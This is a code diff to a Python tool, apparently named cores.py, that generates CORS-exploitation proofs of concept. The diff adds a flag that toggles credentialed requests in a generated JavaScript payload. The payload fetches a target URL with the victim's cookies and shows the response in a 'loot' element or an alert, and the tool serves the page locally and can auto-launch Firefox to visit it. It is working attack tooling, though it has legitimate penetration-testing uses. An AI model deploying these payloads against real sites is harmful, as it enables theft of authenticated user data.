@@ -28,12 +28,13 @@ def parse_args():
 	# Custom Usage
 	msg = """cores.py cores.py <URL> <OPTIONS>
 	Example: python cores.py https://site.com/
-	Example: python cores.py https://site.com/ -m GET -p 8080 -s alert -v -a\n
+	Example: python cores.py https://site.com/ -m POST -p 8080 -c -s alert --verbose --auto\n
          [-m, Define HTTP request method ex: -m POST]
          [-p, Define HTTP Server port ex: -p 8080]
-         [-a, Auto-launches FireFox to automatically visit destination server.]
 
-         [-s, Define Log style ex: JavaScript Alert / Inner HTML ]
+         [-c, Sets "Access-Control-Allow-Credentials: true" ex: -c]
+         [-a, Auto-launches FireFox to automatically visit destination server.]
+         [-s, Select Log style ex: JavaScript Alert / Inner HTML ]
         """
 	# Create Parser
 	parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, description=' '+
@@ -51,11 +52,15 @@ def parse_args():
 	style_group.add_argument('-s', type=str, metavar='alert, html', nargs='?', const=1, default = 'html', #required=True,
 		help='ex: -s html   Displays logs in generated HTML.\n'+
 			 'ex: -s alert  Displays logs in JavaScript Alert function.')
-	# Browser Auto Launch Arguments
+	# Enables Credentials Argument.
 	autolaunch_group = parser.add_mutually_exclusive_group()
-	autolaunch_group.add_argument('-a',action='store_true', #required=True,
+	autolaunch_group.add_argument('-c','--creds',action='store_true', #required=True,
+		help='Sets "Access-Control-Allow-Credentials: true"')	
+	# Browser Auto Launch Argument.
+	autolaunch_group = parser.add_mutually_exclusive_group()
+	autolaunch_group.add_argument('-a','--auto',action='store_true', #required=True,
 		help='Enables FireFox to auto-launch.')
-	# ME/Verbose Arguments
+	# ME/Verbose Argument
 	group = parser.add_mutually_exclusive_group()
 	group.add_argument('-v','--verbose',action='store_true',
 		help='Turn on Verbosity (Displays JavaScript code in STDOUT)\n')
@@ -89,15 +94,20 @@ def browser_launch(url):
 	    print("Firefox not found!")
 	webbrowser.get(str(browser_path)).open(url)
 
-def cors_js_template(style, method, url, filename):
+def cors_js_template(url, creds, method, style, filename):
 	'''1. Create CORS template for JavaScript Payload '''
 	'''2. Write CORS template to file '''
+	if creds:
+		creds = 'true'
+	else:
+		creds = 'false'
+
 	if style == 'html':
 		cors_js_template = """
 		var req = new XMLHttpRequest();
 		req.onload = reqListener;
 		req.open('{0}','{1}',true);
-		req.withCredentials = true;
+		req.withCredentials = {2};
 		req.send();
 		function reqListener() {{
 		 	document.getElementById("loot").innerHTML = (this.responseText);
@@ -107,12 +117,12 @@ def cors_js_template(style, method, url, filename):
 		var req = new XMLHttpRequest();
 		req.onload = reqListener;
 		req.open('{0}','{1}',true);
-		req.withCredentials = true;
+		req.withCredentials = {2};
 		req.send();
 		function reqListener() {{
 		 	window.alert(this.responseText);
 		 }};"""
-	cors_js = cors_js_template.format(method, url)
+	cors_js = cors_js_template.format(method, url, creds)
 	with open(filename, 'w+') as f1:
 		f1.write(cors_js)
 	return cors_js
@@ -203,9 +213,10 @@ if __name__ == '__main__':
 		pass #CHECK
 	# Obtain Internal IP Address	
 	ipAddress = get_internal_address()
-	
-	# Create payload file
-	cors_js = cors_js_template(args.s.lower(), args.m, args.url, js_path)
+
+	# Create JS payload file
+	cors_js = cors_js_template(args.url, args.creds, args.m.upper(), args.s.lower(), js_path)
+	# Build HTML Payload
 	html_indexPage = html_template(cors_js, html_path)
 
 	# Check for (-v)erbose
@@ -221,7 +232,7 @@ if __name__ == '__main__':
 	print('\n')
 
 	# Check for (-a)uto Launch
-	if args.a:
+	if args.auto:
 		browser_launch(server_url)
 	else:
 		pass
